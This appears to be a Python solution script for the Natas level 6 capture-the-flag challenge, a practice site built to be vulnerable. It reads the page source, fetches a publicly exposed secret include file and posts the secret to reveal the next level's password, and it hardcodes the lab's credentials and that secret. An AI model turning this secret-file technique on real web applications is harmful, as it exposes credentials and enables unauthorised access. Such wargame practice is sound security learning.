# webscraper for natas6
import requests
from bs4 import BeautifulSoup

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
url = 'http://%s.natas.labs.overthewire.org/' % username
proxies = {
    'http': 'http://127.0.0.1:6996',
    'https': 'http://127.0.0.1:6996',
}

def initialRequest():
    session = requests.Session()
    resp = session.get(url, auth=(username, password))
    content = resp.text
    soup = BeautifulSoup(content, 'html.parser')
    viewSourceURI = soup.find('a')['href']
    print(viewSourceURI)
    return viewSourceURI

def sourceRequest(): #shows 'include "includes/secret.inc";'
    session = requests.Session()
    resp2 = session.get(url+'/'+viewSource, auth=(username, password))
    content = resp2.text
    #print(content)
    soup = BeautifulSoup(content, 'html.parser')
    print(soup.code)

def includesRequest(): #secret = $secret = "FOEIUWGHFEEUHOFUOIU"
    session = requests.Session()
    resp3 = session.get(url+'/includes/secret.inc', auth=(username, password))
    content = resp3.text
    print(content)

def secretPost(): #make post with secret to obtain password
    session = requests.Session()
    resp4 = session.post(url, auth=(username, password), proxies=proxies, data={'secret':'FOEIUWGHFEEUHOFUOIU', 'submit':'Submit+Query'})
    content = resp4.text
    soup = BeautifulSoup(content, 'html.parser')
    passText=soup.find('div', id = 'content')
    print(passText.getText)


viewSource = initialRequest()
sourceRequest()
includesRequest()
secretPost()
